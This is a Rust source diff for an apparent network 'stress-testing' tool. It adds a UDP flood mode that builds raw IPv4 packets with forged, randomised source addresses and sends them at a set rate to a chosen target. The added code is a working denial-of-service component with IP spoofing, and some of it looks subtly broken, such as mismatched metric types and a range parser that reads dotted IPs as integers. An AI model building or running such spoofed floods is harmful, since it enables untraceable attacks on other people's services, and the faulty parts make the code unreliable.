@@ -3,7 +3,7 @@ use crate::error::{Result, SlapperError};
 #[cfg(feature = "stress-testing")]
 use rand::Rng;
 #[cfg(feature = "stress-testing")]
-use std::net::{IpAddr, SocketAddr};
+use std::net::{IpAddr, Ipv4Addr, SocketAddr};
 #[cfg(feature = "stress-testing")]
 use std::sync::Arc;
 #[cfg(feature = "stress-testing")]
@@ -124,6 +124,195 @@ pub async fn run_udp_flood(config: &StressConfig, metrics: &StressMetrics) -> Re
     let payload = generate_payload(config.payload_size);
 
     metrics.start();
+
+    if config.spoof_source {
+        #[cfg(all(feature = "stress-testing", unix))]
+        {
+            return run_udp_flood_spoofed(config, target_addr, payload, metrics).await;
+        }
+
+        #[cfg(not(all(feature = "stress-testing", unix)))]
+        {
+            tracing::warn!("IP spoofing requires Unix and raw socket support");
+            return Err(SlapperError::Runtime(
+                "IP spoofing not supported on this platform".to_string(),
+            ));
+        }
+    }
+
+    run_udp_flood_standard(config, target_addr, payload, metrics).await
+}
+
+#[cfg(all(feature = "stress-testing", unix))]
+async fn run_udp_flood_spoofed(
+    config: &StressConfig,
+    target_addr: SocketAddr,
+    payload: Vec<u8>,
+    metrics: Arc<StressMetrics>,
+) -> Result<StressStats> {
+    use raw_udp::build_udp_packet;
+    use std::net::Ipv4Addr;
+
+    let target_ip_v4 = match target_addr.ip() {
+        IpAddr::V4(ip) => ip,
+        IpAddr::V6(_) => {
+            return Err(SlapperError::Runtime(
+                "IPv6 not supported for spoofed UDP".to_string(),
+            ));
+        }
+    };
+
+    let src_ips: Vec<Ipv4Addr> = if let Some(ref range) = config.spoof_range {
+        parse_spoof_range(range)?
+    } else {
+        vec![generate_random_ip()]
+    };
+
+    let duration = Duration::from_secs(config.duration_secs);
+    let start_time = Instant::now();
+    let interval = Duration::from_micros(1_000_000 / config.rate_pps.max(1));
+
+    let socket = unsafe {
+        let sock = libc::socket(libc::PF_INET, libc::SOCK_RAW, libc::IPPROTO_RAW);
+        if sock < 0 {
+            return Err(SlapperError::Runtime(format!(
+                "Failed to create raw socket: {}",
+                std::io::Error::last_os_error()
+            )));
+        }
+
+        let one: libc::c_int = 1;
+        if libc::setsockopt(
+            sock,
+            libc::IPPROTO_IP,
+            libc::IP_HDRINCL,
+            &one as *const _ as *const libc::c_void,
+            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
+        ) < 0
+        {
+            libc::close(sock);
+            return Err(SlapperError::Runtime(format!(
+                "Failed to set IP_HDRINCL: {}",
+                std::io::Error::last_os_error()
+            )));
+        }
+
+        std::sync::Mutex::new(sock)
+    };
+
+    let socket = Arc::new(socket);
+    let src_ips = Arc::new(src_ips);
+    let metrics = Arc::new(metrics);
+
+    let mut handles = Vec::new();
+
+    while start_time.elapsed() < duration {
+        let src_ip = src_ips[rand::random::<usize>() % src_ips.len()];
+        let src_port = if config.random_source_port {
+            rand::random::<u16>()
+        } else {
+            0
+        };
+
+        let packet = build_udp_packet(
+            src_ip,
+            src_port,
+            target_ip_v4,
+            target_addr.port(),
+            &payload,
+        );
+
+        let socket = socket.clone();
+        let metrics = metrics.clone();
+
+        let handle = tokio::spawn(async move {
+            let dst = libc::sockaddr_in {
+                sin_family: libc::AF_INET as u16,
+                sin_port: target_addr.port().to_be(),
+                sin_addr: u32::from_be_bytes(target_ip_v4.octets()),
+                sin_zero: [0; 8],
+            };
+
+            let result = unsafe {
+                let sock = *socket.lock().unwrap();
+                libc::sendto(
+                    sock,
+                    packet.as_ptr() as *const libc::c_void,
+                    packet.len(),
+                    0,
+                    &dst as *const _ as *const libc::sockaddr,
+                    std::mem::size_of::<libc::sockaddr_in>() as libc::socklen_t,
+                )
+            };
+
+            if result >= 0 {
+                metrics.record_packet(packet.len() as u64);
+            } else {
+                metrics.record_error();
+            }
+        });
+
+        handles.push(handle);
+
+        if interval > Duration::ZERO {
+            tokio::time::sleep(interval).await;
+        }
+    }
+
+    futures::future::join_all(handles).await;
+
+    if let Ok(guard) = socket.lock() {
+        unsafe { libc::close(*guard) };
+    }
+
+    Ok(metrics.to_stats())
+}
+
+fn parse_spoof_range(range: &str) -> Result<Vec<Ipv4Addr>> {
+    let mut ips = Vec::new();
+    let parts: Vec<&str> = range.split('-').collect();
+
+    if parts.len() == 2 {
+        let start: u32 = parts[0]
+            .parse()
+            .map_err(|_| SlapperError::Runtime("Invalid start IP".to_string()))?;
+        let end: u32 = parts[1]
+            .parse()
+            .map_err(|_| SlapperError::Runtime("Invalid end IP".to_string()))?;
+
+        for ip in start..=end {
+            ips.push(Ipv4Addr::from(ip));
+        }
+    } else if parts.len() == 1 {
+        let cidr: ipnet::Ipv4Net = range
+            .parse()
+            .map_err(|_| SlapperError::Runtime("Invalid CIDR".to_string()))?;
+
+        for ip in cidr.iter() {
+            ips.push(ip);
+        }
+    }
+
+    Ok(ips)
+}
+
+fn generate_random_ip() -> Ipv4Addr {
+    let mut rng = rand::thread_rng();
+    Ipv4Addr::new(
+        rng.gen_range(1..254),
+        rng.gen_range(0..255),
+        rng.gen_range(0..255),
+        rng.gen_range(1..254),
+    )
+}
+
+#[cfg(feature = "stress-testing")]
+async fn run_udp_flood_standard(
+    config: &StressConfig,
+    target_addr: SocketAddr,
+    payload: Vec<u8>,
+    metrics: StressMetrics,
+) -> Result<StressStats> {
 
     let start_time = Instant::now();
     let duration = Duration::from_secs(config.duration_secs);
